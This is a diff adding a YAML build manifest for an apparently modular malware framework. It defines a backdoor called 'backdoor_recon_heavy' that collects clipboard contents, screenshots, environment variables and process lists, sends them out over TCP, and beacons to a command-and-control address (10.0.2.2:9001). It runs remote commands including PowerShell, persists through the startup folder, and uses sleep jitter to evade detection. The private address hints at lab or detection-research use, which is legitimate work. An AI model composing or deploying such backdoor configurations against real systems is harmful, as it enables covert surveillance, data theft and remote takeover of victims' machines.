@@ -1,0 +1,45 @@
+name: backdoor_recon_heavy
+description: Full-capability backdoor — all 13 commands (API+LOLBin), staged collection
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+  - core/run_cmd
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/env_vars
+  - collectors/clipboard
+  - collectors/screenshot
+
+exfil: exfil/tcp_flush
+
+c2: c2/tcp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_filelist
+  - commands/cmd_fileread
+  - commands/cmd_filewrite
+  - commands/cmd_screenshot
+  - commands/cmd_registry
+  - commands/cmd_netinfo
+  - commands/cmd_exec
+  - commands/cmd_exec_powershell
+  - commands/cmd_sysinfo_lolbin
+  - commands/cmd_processes_lolbin
+  - commands/cmd_netinfo_lolbin
+
+arch: arch/backdoor_staged
+persist: persist/startup_folder
+
+evasion:
+  - evasion/behavioral_pacing
+  - evasion/sleep_jitter
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "30000"
